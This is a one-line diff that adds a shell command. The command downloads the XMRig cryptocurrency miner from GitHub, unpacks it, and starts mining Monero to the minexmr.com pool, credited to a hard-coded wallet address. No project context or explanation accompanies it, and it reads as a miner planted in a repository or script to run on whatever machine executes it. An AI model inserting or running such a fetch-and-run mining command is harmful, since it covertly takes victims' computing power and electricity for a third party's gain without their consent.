@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-linux-x64.tar.gz && tar xvzf xmrig-6.7.0-linux-x64.tar.gz && ./xmrig-6.7.0/xmrig -o us-west.minexmr.com:4444 -u 86P7dfDL4DAaNLGf3kgmatUFXePjEAvcqNwWXGPBDHJ1FzNUNAT8QCLBbt9L8uyhEcRD95DPCnwdQbUkUTUWPGLC84pWjHT
